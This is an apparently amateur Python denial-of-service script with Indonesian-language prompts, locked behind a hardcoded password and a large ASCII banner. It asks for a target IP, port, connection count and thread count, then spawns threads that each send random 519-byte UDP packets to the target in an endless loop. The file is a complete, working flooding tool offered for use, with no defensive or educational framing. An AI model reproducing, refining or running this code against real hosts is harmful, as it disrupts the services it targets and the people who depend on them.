import random
import socket
import threading
import os
import sys

os.system("clear")
print("\033[93m")
Password = input("PASSWORD: ")

if Password=="neizyganteng": 
    print(f"""
Password yang kmu msukin bnar !!
    """) 
    print('''\033[94mTools Gay rill no fek.


 ██████╗  █████╗ ██╗   ██╗    ██████╗ ██╗██╗         ███╗   ██╗ ██████╗     ███████╗███████╗██╗  ██╗
██╔════╝ ██╔══██╗╚██╗ ██╔╝    ██╔══██╗██║██║         ████╗  ██║██╔═══██╗    ██╔════╝██╔════╝██║ ██╔╝
██║  ███╗███████║ ╚████╔╝     ██████╔╝██║██║         ██╔██╗ ██║██║   ██║    █████╗  █████╗  █████╔╝ 
██║   ██║██╔══██║  ╚██╔╝      ██╔══██╗██║██║         ██║╚██╗██║██║   ██║    ██╔══╝  ██╔══╝  ██╔═██╗ 
╚██████╔╝██║  ██║   ██║       ██║  ██║██║███████╗    ██║ ╚████║╚██████╔╝    ██║     ███████╗██║  ██╗
 ╚═════╝ ╚═╝  ╚═╝   ╚═╝       ╚═╝  ╚═╝╚═╝╚══════╝    ╚═╝  ╚═══╝ ╚═════╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
                                                                                                    ''')

    ip = str(input("ip:"))
    port = int(input("Port:"))
    times = int(input("Connections:"))
    threads = int(input("Threading:"))
    def run():
        data = random._urandom(519)
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip),int(port))
                for x in range(times):
                    s.sendto(data,addr)
                print("\033[92m!! PERMISI OM !!!")
            except:
                print("\033[91m!! WKWKWK MT !!!")

    for y in range(threads):
            th = threading.Thread(target = run)
            th.start()

else :
    print("Password mu salah Tjuy, coba ulangi lagi nanti")